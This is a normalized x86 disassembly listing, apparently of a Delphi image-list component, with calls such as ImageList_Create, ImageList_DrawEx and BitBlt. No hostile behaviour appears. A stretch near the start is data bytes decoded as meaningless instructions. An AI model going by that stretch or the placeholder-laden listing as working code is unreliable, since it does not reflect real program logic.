call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_45c6e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45c705
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c70c
retn
sub_45c7bc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x45c8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x38 ] cl
inc ebp
add [ eax - 0x38 ] dl
inc ebp
add [ eax ] ch
add [ eax ] al
pop eax
jo r-xdata
loopne r-xdata
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax - 0x37 ] dh
inc ebp
add al al
rol [ ebp ] cl
dec eax
xlat
inc ebp
add [ eax ] al
rol [ ebp ] cl
rcl [ edi ] 0x42
add [ esi + edx + 0x17d00042 ] cl
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
fild [ ebp ]
mov ah bl
inc ebp
add [ eax ] al
aad 0x45
add [ ecx ] al
add bh ch
call [ eax ]
aad 0x45
add [ eax ] dl
push esp
inc ebx
jne r-xdata
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
ror al 0x1
inc ebp
add ah dh
into
inc ebp
add ah bl
leave
inc ebp
add ah bh
mov eax 0x20000000
retn
je r-xdata
pop ds
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x6800408d
enter 0x45 0x7
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
ror [ ebx + 0x4a85e8c6 ] cl
cld
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 + 0x49e80f74 ] 0x6d
cli
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
push esp
jno r-xdata
retn
mov eax 0x1fffffff
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
sub_45c8d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421370
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_45c91c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_421370
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_45c970
push ebx
push esi
push edi
call sub_403664
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418a98
mov edx eax
mov eax edi
call sub_45d560
mov eax [ edi + 0x50 ]
call sub_4032b0
mov eax edi
call sub_45cc34
mov eax [ edi + 0x4c ]
call sub_4032b0
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4213bc
test bl bl
jle r-xdata
call sub_4032b0
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40364c
sub_45c9dc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45ca89
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_45d4e8
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_45caa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ca90
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_45caa8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45cb49
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_428f08
mov eax ebx
call sub_428308
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424bc0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_417358
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_428308
pop edx
call sub_425224
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cb50
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_45cb6c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_45caa8
pop ecx
pop edx
pop ebx
retn
sub_45cba4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45cc34
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_45cb6c
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_4034ac
sub_45cbe0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_45d470
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_428374
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45cc34
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45ca94
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_4034ac
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_45cbd0
push eax
call ImageList_Destroy
sub_45cc6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_45ccff
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_45ca94
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cd06
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov edx eax
mov eax ebx
call sub_45ce94
sub_45cd0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45cdbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45cd9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45ca9c
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45cbe0
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_45cbe0
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cda5
mov eax [ ebp - 0x10 ]
call sub_4032b0
retn
sub_45cdd8
push ebx
mov ebx eax
mov eax ebx
call sub_45ca94
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_45cbd0
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_45cdfc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45ce7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_45cdd8
cmp esi eax
jl r-xdata
mov eax ebx
call sub_45ca94
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax ebx
mov si 0xffef
call sub_4034ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ce82
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
push esi
mov eax ebx
call sub_45cbd0
push eax
call ImageList_Remove
sub_45ce94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45ca94
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_45c890
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_4034ac
pop esi
pop ebx
retn
sub_45cecc
push ebx
mov ebx eax
mov eax ebx
call sub_45ca94
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_45cbd0
push eax
call ImageList_GetBkColor
call sub_45c8b0
pop ebx
retn
sub_45cef4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_45ca94
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_45c890
push eax
mov eax ebx
call sub_45cecc
call sub_45c890
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_425648
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_45cbd0
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_428308
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_424bc0
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_417358
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_428308
pop edx
call sub_425224
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_428308
call sub_425648
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_45cbd0
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_417358
mov eax [ ebx + 0x54 ]
call sub_428308
call sub_425648
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_424bc0
mov eax edi
call sub_425648
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_424bc0
mov eax edi
call sub_425648
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_429158
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_45d0c8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_45d0ec
pop ebx
pop ebp
retn 0xc
sub_45d0ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_45ca94
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45d138
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_417358
mov eax [ ebp - 0x4 ]
call sub_45ddcc
xor eax eax
push ebp
push sub_45d2d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45d2b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45d297
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_429158
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d29e
mov eax [ ebp - 0x10 ]
call sub_4032b0
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_428308
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_425224
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_425648
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_428308
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_425224
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_425648
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45cd0c
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_45d2e0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45cbd0
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_45d138
sub_45d300
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax ebx
call sub_45cc34
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418fac
mov eax ebx
call sub_45ce88
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_45d4e8
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_45cbd0
mov edx eax
mov eax ebx
call sub_45cb6c
mov eax ebx
call sub_45ca94
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_45cbd0
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_45ca9c
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45cbd0
push eax
call ImageList_GetBkColor
call sub_45c8b0
mov edx eax
mov eax ebx
call sub_45ce94
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_45d2e0
jmp r-xdata
sub_45d3c0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_419090
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_45d4e8
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_45ce88
mov eax esi
call sub_45cbd0
mov edx eax
mov eax ebx
call sub_45cb6c
mov eax ebx
call sub_45ca94
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_45cbd0
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_45ca9c
jmp r-xdata
mov eax esi
call sub_45cbd0
push eax
call ImageList_GetBkColor
call sub_45c8b0
mov edx eax
mov eax ebx
call sub_45ce94
mov edx esi
mov eax ebx
call sub_45d2e0
pop esi
pop ebx
retn
sub_45d470
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d4dc
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d4e3
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_45d510
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_4189b0
mov si 0xffff
call sub_4034ac
inc ebp
dec edi
jne r-xdata
sub_45d560
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4188a0
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4189b0
cmp ebp eax
jne r-xdata
sub_45d5b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407fac
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45d5fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_45cdd8
mov ebx eax
mov eax edi
call sub_45cdd8
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_45cdd8
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45d6d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45d6bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_45d5b8
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d6c2
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
mov eax edi
call sub_45cdd8
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_45d6ec
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45cdd8
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_45d5fc
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_45d748
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4216e8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_45d6ec
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45d7a0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41b094
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41b094
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45da24
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41ae68
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41ae88
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45da07
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_427d40
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_429158
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_417358
mov eax [ ebp - 0x4 ]
call sub_45ddcc
xor eax eax
push ebp
push sub_45d9ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d9f1
